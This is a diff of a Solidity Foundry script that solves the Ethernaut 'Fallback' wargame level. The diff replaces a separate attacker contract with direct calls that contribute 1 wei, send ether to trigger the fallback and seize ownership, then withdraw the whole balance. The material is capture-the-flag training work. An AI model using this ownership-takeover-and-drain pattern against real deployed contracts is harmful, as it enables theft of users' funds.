@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: MIT
 pragma solidity 0.8.0;
 
-import {FallbackAttacker} from "../../src/2-fallback/FallbackAttacker.sol";
+import {Fallback} from "../../src/2-fallback/Fallback.sol";
 import {Ethernaut} from "../../src/Ethernaut.sol";
 import {Script} from "forge-std/Script.sol";
 
@@ -14,13 +14,20 @@ contract FallbackAttack is Script{
 
     // Instantiating contracts
     Ethernaut ethernaut = Ethernaut(ethernautAddress);
+    Fallback fallbackContract = Fallback(payable(fallbackAddress));
 
     vm.startBroadcast(attacker);
-    // deploy attacker contract
-    FallbackAttacker fallbackAttacker = new FallbackAttacker(payable(fallbackAddress));
 
     // Attack
-    fallbackAttacker.attack{value: 2}();
+    // Contributing
+    fallbackContract.contribute{value: 1}();
+    
+    // Sending eth
+    (bool success,) = payable(address(fallbackContract)).call{value: 1}("");
+    if(!success) revert();
+
+    // Withdrawing all eth
+    fallbackContract.withdraw();
 
     // Submit level instance
     ethernaut.submitLevelInstance(payable(fallbackAddress));
